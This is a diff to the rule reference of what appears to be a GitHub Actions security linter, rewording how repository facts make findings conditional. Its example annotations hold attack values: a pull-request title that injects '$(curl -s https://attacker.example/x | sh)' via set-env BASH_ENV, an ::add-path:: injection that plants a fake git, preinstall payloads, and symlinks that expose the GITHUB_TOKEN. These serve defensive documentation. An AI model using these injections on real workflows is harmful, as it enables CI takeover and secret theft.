+      #   U+2010, so the title ::add path::/tmp/x makes the name ::add-path::/tmp/x,
+      #   and the runner reads a printed line that starts with ::add-path:: as a
+      #   command where the flag is true.
       # attack-value: github.event.pages[0].page_name = "::add-path::/tmp/x"
       # attack-run-behavior: the step prints the name, the runner puts /tmp/x
       #   before the PATH of the next step, and an executable named git in /tmp/x
@@ -64406,7 +64427,7 @@
 - pull-request-target-blocked: a workflow whose on has pull_request_target and no other event (no workflow_call event either), in a repository whose Actions policies block the runs of the workflow on pull_request_target (repo.pull-request-target-allowed false): an event policy that an administrator sets without pull_request_target among the allowed events, or the default policy that GitHub adds to a public repository without an applicable event policy, from the time when GitHub enforces the default policy on the repository. GitHub's documents say that GitHub evaluates the policies before a run, and that a run that a policy does not allow fails with an error. The documents do not say whether a job of such a run starts before the run fails; the rule assumes that no job of such a run starts
   - finding kinds: unsecure-commands.controlled
   - fact kinds:
-    - repo.pull-request-target-allowed (provider: repo-setting, assumed value: true)
+    - repo.pull-request-target-allowed (provider: repo-setting, answer that removes the finding: false)
   - example: pull-request-target-blocked.yml (workflow, false-positive)
     ```yaml
     # situation: on pull_request_target, a job sets
@@ -64421,9 +64442,10 @@
     #   run that a policy does not allow fails with an error; the documents do not
     #   say whether a job of such a run starts before the run fails, and the rule
     #   assumes that no job starts.
-    # cause: the rule assumes that a run on pull_request_target starts, unless a
-    #   file of facts or --fact says that the Actions policies block the runs
-    #   (repo.pull-request-target-allowed is assumed true, the worst case).
+    # cause: unless a file of facts or --fact says that the Actions policies block
+    #   runs on pull_request_target (repo.pull-request-target-allowed false), the
+    #   rule reports the finding. When no file of facts and no --fact answers
+    #   repo.pull-request-target-allowed, the finding is conditional.
     # attack: the author of a pull request from a fork titles the pull request
     #   ##[set-env name=BASH_ENV;]$(curl -s https://attacker.example/x | sh).
     # attack-run-behavior: the pull request of the attacker triggers
@@ -64638,12 +64660,12 @@
   - cites:
     - <https://docs.github.com/en/actions/reference/workflows-and-actions/events-that-trigger-workflows#workflow_call>
     - <https://github.com/advisories/GHSA-7x29-qqmq-v6qc>
-- precondition wiki-open: on gollum, an account with no role in the repository can edit the wiki only in a public repository whose settings let anyone with an account edit the wiki (the fact repo.wiki-open). The finding holds only when repo.wiki-open is true, and the rule assumes repo.wiki-open to be true unless a file of facts says otherwise
+- precondition wiki-open: on gollum, an account with no role in the repository can edit the wiki only in a public repository whose settings let anyone with an account edit the wiki (the fact repo.wiki-open). The finding holds only when repo.wiki-open is true, and the finding is conditional when no source answers repo.wiki-open
   - observed: 2026-09-25, runner 2.337.0: a wiki page titled with \$( ) and backticks, written into run as github.event.pages&#91;0].title, ran the commands; GitHub kept \$, (, ), backticks and ;
   - observed: 2026-10-30, runner 2.338.0: in a public repository whose settings let anyone with an account edit the wiki, an account with no role in the repository created a wiki page on the web interface of GitHub and edited the page; the creation and the edit each started a run of gollum, and each run had the repository's secret, and a step of each run created a ref with the token of the run, which the workflow asked for with contents: write
   - cites:
     - <https://docs.github.com/en/communities/documenting-your-project-with-wikis/changing-access-permissions-for-wikis>
-- precondition app-status-check: an app outside GitHub Actions, such as an outside CI, makes a commit status or a check run for a commit whose message an attacker writes (a commit of a pull request from a fork, or a commit that merges a pull request; the message of a commit that merges a pull request can have the title of the pull request), and the commit status or the check run starts a run of status, check_suite or check_run, which runs the workflow of the default branch, whatever branch the commit is on. The payload of a run of any of the three events has the SHA of the commit, and the payload of a run of status or check_suite also has the message, the author name and the committer name of the commit. A finding of a workflow whose on has only events among status, check_suite and check_run (one, two or all three) holds only when the fact of the commit is true: repo.fork-pr-app-checks for a commit of a pull request from a fork, and repo.merge-commit-app-checks for a commit that the merge of a pull request puts in a branch of the repository or that a merge queue of the repository makes. A finding kind asks the fact of each kind of commit that its attackers write; the finding of a finding kind that asks both facts holds when at least one of the two facts is true. The rule does not ask these facts of a workflow whose on has another event too, and reports the finding of such a workflow whatever the values of the facts are. The rule assumes each fact to be true unless a file of facts says otherwise
+- precondition app-status-check: an app outside GitHub Actions, such as an outside CI, makes a commit status or a check run for a commit whose message an attacker writes (a commit of a pull request from a fork, or a commit that merges a pull request; the message of a commit that merges a pull request can have the title of the pull request), and the commit status or the check run starts a run of status, check_suite or check_run, which runs the workflow of the default branch, whatever branch the commit is on. The payload of a run of any of the three events has the SHA of the commit, and the payload of a run of status or check_suite also has the message, the author name and the committer name of the commit. A finding of a workflow whose on has only events among status, check_suite and check_run (one, two or all three) holds only when the fact of the commit is true: repo.fork-pr-app-checks for a commit of a pull request from a fork, and repo.merge-commit-app-checks for a commit that the merge of a pull request puts in a branch of the repository or that a merge queue of the repository makes. A finding kind asks the fact of each kind of commit that its attackers write; the finding of a finding kind that asks both facts holds when at least one of the two facts is true. The rule does not ask these facts of a workflow whose on has another event too, and reports the finding of such a workflow whatever the values of the facts are. The finding is conditional when no file of facts and no --fact answers the facts
   - observed: 2026-11-05, runner 2.338.2: a GitHub App made a commit status and a check run for a commit of a pull request from a fork: runs of status, check_suite and check_run started on the default branch, and the message of the commit, with \$( ) in it, was in commit.commit.message of status and in check_suite.head_commit.message of check_suite
   - observed: 2026-11-06, runner 2.338.2: the same again: the SHA of the commit of the pull request was in sha and commit.sha of status, check_suite.head_sha and check_suite.head_commit.id of check_suite, and check_run.head_sha and check_run.check_suite.head_sha of check_run; check_suite.after and check_suite.before were null; the author name and the committer name of the commit, with \$( ) in each, were in the payloads of status and check_suite
   - cites:
@@ -65290,7 +65312,7 @@
   - remedy: compare whole values: contains(fromJSON('&#91;...]'), the reference)
   - severity: high (found from the CVSS metrics below by the table)
   - fix kinds: contains-array
-  - fact kinds: repo.pull-request-target-allowed (provider: repo-setting, assumed value: true)
+  - fact kinds: repo.pull-request-target-allowed (provider: repo-setting)
   - attackers: fork-pr-author, issue-author, commenter, anyone-who-forks
   - preconditions: substring, chosen-login, callers-events
   - true positives:
@@ -65599,7 +65621,7 @@
   - remedy: compare the whole value: the reference == 'the string'
   - severity: critical (found from the CVSS metrics below by the table)
   - fix kinds: equality
-  - fact kinds: repo.pull-request-target-allowed (provider: repo-setting, assumed value: true)
+  - fact kinds: repo.pull-request-target-allowed (provider: repo-setting)
   - attackers: fork-pr-author, issue-author, commenter, anyone-who-forks
   - preconditions: substring, chosen-login, callers-events
   - true positives:
@@ -67097,7 +67119,7 @@
 - pull-request-target-blocked: a workflow whose on has pull_request_target and no other event (no workflow_call event either), in a repository whose Actions policies block the runs of the workflow on pull_request_target (repo.pull-request-target-allowed false): an event policy that an administrator sets without pull_request_target among the allowed events, or the default policy that GitHub adds to a public repository without an applicable event policy, from the time when GitHub enforces the default policy on the repository. GitHub's documents say that GitHub evaluates the policies before a run, and that a run that a policy does not allow fails with an error. The documents do not say whether a job of such a run starts before the run fails; the rule assumes that no job of such a run starts
   - finding kinds: unsound-contains.substring, unsound-contains.superstring
   - fact kinds:
-    - repo.pull-request-target-allowed (provider: repo-setting, assumed value: true)
+    - repo.pull-request-target-allowed (provider: repo-setting, answer that removes the finding: false)
   - example: pull-request-target-blocked.yml (workflow, false-positive)
     ```yaml
     # situation: on pull_request_target, the job runs ./deploy.sh with
@@ -67112,9 +67134,10 @@
     #   run that a policy does not allow fails with an error; the documents do not
     #   say whether a job of such a run starts before the run fails, and the rule
     #   assumes that no job starts.
-    # cause: the rule assumes that a run on pull_request_target starts, unless a
-    #   file of facts or --fact says that the Actions policies block the runs
-    #   (repo.pull-request-target-allowed is assumed true, the worst case).
+    # cause: unless a file of facts or --fact says that the Actions policies block
+    #   runs on pull_request_target (repo.pull-request-target-allowed false), the
+    #   rule reports the finding. When no file of facts and no --fact answers
+    #   repo.pull-request-target-allowed, the finding is conditional.
     # attack-value: github.event.pull_request.user.login = "ali"
     # attack-run-behavior: the pull request of the attacker triggers
     #   pull_request_target, and the run fails with an error, and no job of the
@@ -67361,7 +67384,7 @@
   - remedy: check out the base's code, or run the pull request's code in a pull_request workflow and pass only data to a privileged one
   - severity: critical (found from the CVSS metrics below by the table)
   - fix kinds: base-checkout
-  - fact kinds: repo.environment-protected (provider: repo-setting, assumed value: false), git.commit-contains (provider: github, assumed value: none), repo.pull-request-target-allowed (provider: repo-setting, assumed value: true), repo.fork-pr-app-checks (provider: repo-setting, assumed value: true)
+  - fact kinds: repo.environment-protected (provider: repo-setting), git.commit-contains (provider: github), repo.pull-request-target-allowed (provider: repo-setting), repo.fork-pr-app-checks (provider: repo-setting)
   - attackers: fork-pr-author, commenter
   - preconditions: privileged-event, pr-tree, no-guard, no-approval, runs-tree, callers-events, app-status-check
   - incidents: spotbugs-2024
@@ -69052,7 +69075,7 @@
   - remedy: check out the base's code, or say in a file of facts that the checkout is only read as data
   - severity: critical (found from the CVSS metrics below by the table)
   - fix kinds: base-checkout
-  - fact kinds: repo.environment-protected (provider: repo-setting, assumed value: false), checkout.executed (provider: user-supplied, assumed value: true), git.commit-contains (provider: github, assumed value: none), repo.pull-request-target-allowed (provider: repo-setting, assumed value: true), repo.fork-pr-app-checks (provider: repo-setting, assumed value: true)
+  - fact kinds: repo.environment-protected (provider: repo-setting), checkout.executed (provider: user-supplied), git.commit-contains (provider: github), repo.pull-request-target-allowed (provider: repo-setting), repo.fork-pr-app-checks (provider: repo-setting)
   - attackers: fork-pr-author, commenter
   - preconditions: privileged-event, pr-tree, no-guard, no-approval, runs-tree, callers-events, app-status-check
   - incidents: spotbugs-2024
@@ -69069,13 +69092,14 @@
       #   the events push and issue_comment, the if of the checkout and the second
       #   checkout are left out.
       # reason: pull_request_target runs the job with the base repository's token,
-      #   while the merge commit holds the files the author of the pull request, from
-      #   a fork too, pushed, so the files that check-spelling reads are the author's.
-      #   GHSA-g86g-chm8-7r2p says that "an attacker can send a crafted Pull Request
-      #   that causes a GITHUB_TOKEN to be exposed" through a symlink. The finding
-      #   does not say what runs after the checkout: the linter assumes that a step
-      #   after the checkout runs the files of the checkout unless a file of facts
-      #   answers otherwise (the fact checkout.executed).
+      #   while the merge commit holds the files the author of the pull request,
+      #   from a fork too, pushed, so the files that check-spelling reads are the
+      #   author's. GHSA-g86g-chm8-7r2p says that "an attacker can send a crafted
+      #   Pull Request that causes a GITHUB_TOKEN to be exposed" through a symlink.
+      #   The finding does not say what runs after the checkout: the finding holds
+      #   when a step after the checkout runs the files of the checkout (the fact
+      #   checkout.executed true), and is conditional when no file of facts and no
+      #   --fact answers the fact.
       # attack: the author of a pull request from a fork commits a symbolic link to a
       #   file of the runner that holds the token, and opens the pull request.
       # attack-run-behavior: check-spelling reads the file that the link names as a
@@ -69118,10 +69142,11 @@
       # reason: pull_request_target runs the job with the base repository's token
       #   and secrets, while head.sha is the commit the author of the pull request,
       #   from a fork too, pushed, so the files that the three actions read are the
-      #   author's. The finding does not say what runs after the checkout: the linter
-      #   assumes that a step after the checkout runs the files of the checkout unless
-      #   a file of facts answers otherwise (the fact checkout.executed); here each of
-      #   the three actions runs the files of the checkout.
+      #   author's. The finding does not say what runs after the checkout: the
+      #   finding holds when a step after the checkout runs the files of the
+      #   checkout (the fact checkout.executed true), and is conditional when no
+      #   file of facts and no --fact answers the fact; here each of the three
+      #   actions runs the files of the checkout.
       # attack: the author of a pull request from a fork commits .php-version, a
       #   pyproject.toml whose version of black is a direct URL to a repository of
       #   theirs, and .gemini/.env, and opens the pull request.
@@ -71322,16 +71347,17 @@
 - not-executed: a job that uses nothing of the tree it checks out as code or as the settings of a tool, and has no tool that follows a symlink of the tree to a file outside the checkout and puts the content of the file outside the checkout in the log or in an upload that the attacker can read (a job that reads a file of the tree as data is this form, except in the two cases below): no step runs a script, a build, a test or an action of the tree, no tool reads a file of the tree as settings that decide where a request goes or what command runs, and no tool follows a symlink of the tree to a file outside the checkout and puts the content of the file outside the checkout in the log or in an upload that the attacker can read, such as an artifact. A job whose tool reads settings that decide where a request goes or what command runs from the tree is not this form: SonarSource's scanner reads sonar.host.url from a project file of the tree and can send a secret to the host that the pull request names. A job whose tool follows a symlink of the tree to a file outside the checkout and puts the content of the file outside the checkout in the log or in an upload that the attacker can read is not this form either: a parse error of tmatens/compose-lint quotes a line of a file of credentials outside the checkout that a symlink of a pull request names (GHSA-whr6-fgpq-fpv9, GHSA-88f4-frh5-gmcr)
   - finding kinds: untrusted-checkout.checkout
   - fact kinds:
-    - checkout.executed (provider: user-supplied, assumed value: true)
+    - checkout.executed (provider: user-supplied, answer that removes the finding: false)
   - example: not-executed.yml (workflow, false-positive)
     ```yaml
     # situation: the job on pull_request_target checks out the pull request's
     #   head and only counts the lines of a file of it.
     # reason: the job runs nothing of the tree it checks out, and no tool reads a
     #   file of the tree as settings.
-    # cause: when no step is seen to run the tree, the rule takes it as run
-    #   unless a file of facts writes checkout.executed false (it is assumed
-    #   true, the worst case).
+    # cause: unless a file of facts or --fact says that no step runs the tree of
+    #   the checkout (checkout.executed false), the rule reports the finding, also
+    #   when no step is seen to run the tree. When no file of facts and no --fact
+    #   answers checkout.executed, the finding is conditional.
     # attack-value: the file package.json in the pull request's head = "{\"scripts\":{\"preinstall\":\"echo PWNED\"}}"
     # attack-run-behavior: the checkout fetches head.sha into pr, with the pull
     #   request's package.json, and the job only runs wc -l pr/README.md, which
@@ -71377,16 +71403,17 @@
 - environment-protected: a job whose environment has required reviewers, who approve it before it runs
   - finding kinds: untrusted-checkout.executed, untrusted-checkout.checkout
   - fact kinds:
-    - repo.environment-protected (provider: repo-setting, assumed value: false)
+    - repo.environment-protected (provider: repo-setting, answer that removes the finding: true)
   - example: environment-protected.yml (workflow, false-positive)
     ```yaml
     # situation: the job on pull_request_target checks out the pull request's
     #   head and runs npm ci, in the environment production.
     # reason: the environment production has required reviewers, who approve the
     #   job before it runs (then it is untrusted-checkout-toctou's).
-    # cause: the rule takes the environment as one that approves nothing unless
-    #   a file of facts says it has required reviewers
-    #   (repo.environment-protected is assumed false, the worst case).
+    # cause: unless a file of facts or --fact says that the environment has
+    #   required reviewers (repo.environment-protected true), the rule reports the
+    #   finding. When no source answers repo.environment-protected, the finding is
+    #   conditional.
     # attack-value: the file package.json in the pull request's head = "{\"scripts\":{\"preinstall\":\"echo PWNED\"}}"
     # attack-run-behavior: the job waits until a required reviewer of production
     #   approves it; a reviewer who reads the pull request's package.json does
@@ -72281,7 +72308,7 @@
 - pull-request-target-blocked: a workflow whose on has pull_request_target and no other event (no workflow_call event either), in a repository whose Actions policies block the runs of the workflow on pull_request_target (repo.pull-request-target-allowed false): an event policy that an administrator sets without pull_request_target among the allowed events, or the default policy that GitHub adds to a public repository without an applicable event policy, from the time when GitHub enforces the default policy on the repository. GitHub's documents say that GitHub evaluates the policies before a run, and that a run that a policy does not allow fails with an error. The documents do not say whether a job of such a run starts before the run fails; the rule assumes that no job of such a run starts
   - finding kinds: untrusted-checkout.executed, untrusted-checkout.checkout
   - fact kinds:
-    - repo.pull-request-target-allowed (provider: repo-setting, assumed value: true)
+    - repo.pull-request-target-allowed (provider: repo-setting, answer that removes the finding: false)
   - example: pull-request-target-blocked.yml (workflow, false-positive)
     ```yaml
     # situation: on pull_request_target, a job checks out the head of a pull
@@ -72296,9 +72323,10 @@
     #   run that a policy does not allow fails with an error; the documents do not
     #   say whether a job of such a run starts before the run fails, and the rule
     #   assumes that no job starts.
-    # cause: the rule assumes that a run on pull_request_target starts, unless a
-    #   file of facts or --fact says that the Actions policies block the runs
-    #   (repo.pull-request-target-allowed is assumed true, the worst case).
+    # cause: unless a file of facts or --fact says that the Actions policies block
+    #   runs on pull_request_target (repo.pull-request-target-allowed false), the
+    #   rule reports the finding. When no file of facts and no --fact answers
+    #   repo.pull-request-target-allowed, the finding is conditional.
     # attack-value: the file package.json in the head of the pull request = "{\"scripts\": {\"preinstall\": \"echo PWNED\"}}"
     # attack-run-behavior: the pull request of the attacker triggers
     #   pull_request_target, and the run fails with an error, and no job of the
@@ -72471,7 +72499,7 @@
   - observed: 2026-09-28, runner 2.337.0: a pull request from a fork ran pull_request_target, workflow_run after its pull_request, and issue_comment on a comment, each with the repository's secret and a token that created a ref
   - cites:
     - <https://docs.github.com/en/actions/reference/security/securely-using-pull_request_target>
-- precondition app-status-check: an app outside GitHub Actions, such as an outside CI, makes a commit status or a check run for a commit whose message an attacker writes (a commit of a pull request from a fork, or a commit that merges a pull request; the message of a commit that merges a pull request can have the title of the pull request), and the commit status or the check run starts a run of status, check_suite or check_run, which runs the workflow of the default branch, whatever branch the commit is on. The payload of a run of any of the three events has the SHA of the commit, and the payload of a run of status or check_suite also has the message, the author name and the committer name of the commit. A finding of a workflow whose on has only events among status, check_suite and check_run (one, two or all three) holds only when the fact of the commit is true: repo.fork-pr-app-checks for a commit of a pull request from a fork, and repo.merge-commit-app-checks for a commit that the merge of a pull request puts in a branch of the repository or that a merge queue of the repository makes. A finding kind asks the fact of each kind of commit that its attackers write; the finding of a finding kind that asks both facts holds when at least one of the two facts is true. The rule does not ask these facts of a workflow whose on has another event too, and reports the finding of such a workflow whatever the values of the facts are. The rule assumes each fact to be true unless a file of facts says otherwise
+- precondition app-status-check: an app outside GitHub Actions, such as an outside CI, makes a commit status or a check run for a commit whose message an attacker writes (a commit of a pull request from a fork, or a commit that merges a pull request; the message of a commit that merges a pull request can have the title of the pull request), and the commit status or the check run starts a run of status, check_suite or check_run, which runs the workflow of the default branch, whatever branch the commit is on. The payload of a run of any of the three events has the SHA of the commit, and the payload of a run of status or check_suite also has the message, the author name and the committer name of the commit. A finding of a workflow whose on has only events among status, check_suite and check_run (one, two or all three) holds only when the fact of the commit is true: repo.fork-pr-app-checks for a commit of a pull request from a fork, and repo.merge-commit-app-checks for a commit that the merge of a pull request puts in a branch of the repository or that a merge queue of the repository makes. A finding kind asks the fact of each kind of commit that its attackers write; the finding of a finding kind that asks both facts holds when at least one of the two facts is true. The rule does not ask these facts of a workflow whose on has another event too, and reports the finding of such a workflow whatever the values of the facts are. The finding is conditional when no file of facts and no --fact answers the facts
   - observed: 2026-11-05, runner 2.338.2: a GitHub App made a commit status and a check run for a commit of a pull request from a fork: runs of status, check_suite and check_run started on the default branch, and the message of the commit, with \$( ) in it, was in commit.commit.message of status and in check_suite.head_commit.message of check_suite
   - observed: 2026-11-06, runner 2.338.2: the same again: the SHA of the commit of the pull request was in sha and commit.sha of status, check_suite.head_sha and check_suite.head_commit.id of check_suite, and check_run.head_sha and check_run.check_suite.head_sha of check_run; check_suite.after and check_suite.before were null; the author name and the committer name of the commit, with \$( ) in each, were in the payloads of status and check_suite
   - cites:
@@ -72486,9 +72514,9 @@
   - observed: 2026-09-28, runner 2.337.0: v7.0.1 and the major tag v4 refused the fork's head SHA and refs/pull/&lt;n>/head on pull_request_target and workflow_run, and allowed them with allow-unsafe-pr-checkout; v4.2.2 pinned by its SHA fetched them; on issue_comment v7.0.1 fetched refs/pull/&lt;n>/head
   - cites:
     - <https://github.blog/changelog/2026-06-18-safer-pull_request_target-defaults-for-github-actions-checkout>
-- precondition no-approval: no one approves the run: either the job runs on at least one event other than pull_request_target with the activity type labeled, and a run on the other event starts with no label added, or no person adds the label that starts the run, as the label is a label that a workflow of the repository of the job adds to the pull request of an attacker by running actions/labeler with a token other than the GITHUB_TOKEN; and the job has no environment that has required reviewers (repo.environment-protected, assumed false: an environment is made with no protection rules)
+- precondition no-approval: no one approves the run: either the job runs on at least one event other than pull_request_target with the activity type labeled, and a run on the other event starts with no label added, or no person adds the label that starts the run, as the label is a label that a workflow of the repository of the job adds to the pull request of an attacker by running actions/labeler with a token other than the GITHUB_TOKEN; and the job has no environment that has required reviewers (repo.environment-protected false: an environment is made with no protection rules)
   - observed: 2026-09-28, runner 2.337.0: a push after the label ran no labeled run, and ran pull_request_target on synchronize
-- precondition runs-tree: a step after the checkout runs what it brings: a program of the tree, an action of it, or a tool that reads its files (npm, pip, make, go test, cargo, mvn, gradle and the like); when none is seen, the finding holds if one does (checkout.executed, assumed true)
+- precondition runs-tree: a step after the checkout runs what it brings: a program of the tree, an action of it, or a tool that reads its files (npm, pip, make, go test, cargo, mvn, gradle and the like); when none is seen, the finding holds if one does (checkout.executed true)
   - cites:
     - <https://securitylab.github.com/resources/github-actions-preventing-pwn-requests/>
 - actor: fork-pr-author
@@ -72639,7 +72667,7 @@
   - remedy: check out the commit the approval saw: github.event.pull_request.head.sha
   - severity: medium (found from the CVSS metrics below by the table)
   - fix kinds: pin-head-sha, pin-head-sha-review
-  - fact kinds: repo.environment-protected (provider: repo-setting, assumed value: false), git.commit-contains (provider: github, assumed value: none), repo.pull-request-target-allowed (provider: repo-setting, assumed value: true)
+  - fact kinds: repo.environment-protected (provider: repo-setting), git.commit-contains (provider: github), repo.pull-request-target-allowed (provider: repo-setting)
   - attackers: fork-pr-author
   - preconditions: privileged-event, pr-tree, no-guard, approved, movable-checkout, callers-events
   - true positives:
@@ -73631,7 +73659,7 @@
 - pull-request-target-blocked: a workflow whose on has pull_request_target and no other event (no workflow_call event either), in a repository whose Actions policies block the runs of the workflow on pull_request_target (repo.pull-request-target-allowed false): an event policy that an administrator sets without pull_request_target among the allowed events, or the default policy that GitHub adds to a public repository without an applicable event policy, from the time when GitHub enforces the default policy on the repository. GitHub's documents say that GitHub evaluates the policies before a run, and that a run that a policy does not allow fails with an error. The documents do not say whether a job of such a run starts before the run fails; the rule assumes that no job of such a run starts
   - finding kinds: untrusted-checkout-toctou.mutable-ref
   - fact kinds:
-    - repo.pull-request-target-allowed (provider: repo-setting, assumed value: true)
+    - repo.pull-request-target-allowed (provider: repo-setting, answer that removes the finding: false)
   - example: pull-request-target-blocked.yml (workflow, false-positive)
     ```yaml
     # situation: on pull_request_target labeled, the job checks out
@@ -73645,9 +73673,10 @@
     #   run that a policy does not allow fails with an error; the documents do not
     #   say whether a job of such a run starts before the run fails, and the rule
     #   assumes that no job starts.
-    # cause: the rule assumes that a run on pull_request_target starts, unless a
-    #   file of facts or --fact says that the Actions policies block the runs
-    #   (repo.pull-request-target-allowed is assumed true, the worst case).
+    # cause: unless a file of facts or --fact says that the Actions policies block
+    #   runs on pull_request_target (repo.pull-request-target-allowed false), the
+    #   rule reports the finding. When no file of facts and no --fact answers
+    #   repo.pull-request-target-allowed, the finding is conditional.
     # attack: after a maintainer adds a label, the author of the pull request
     #   pushes to the branch of the fork a commit whose package.json has a
     #   preinstall that prints PWNED.
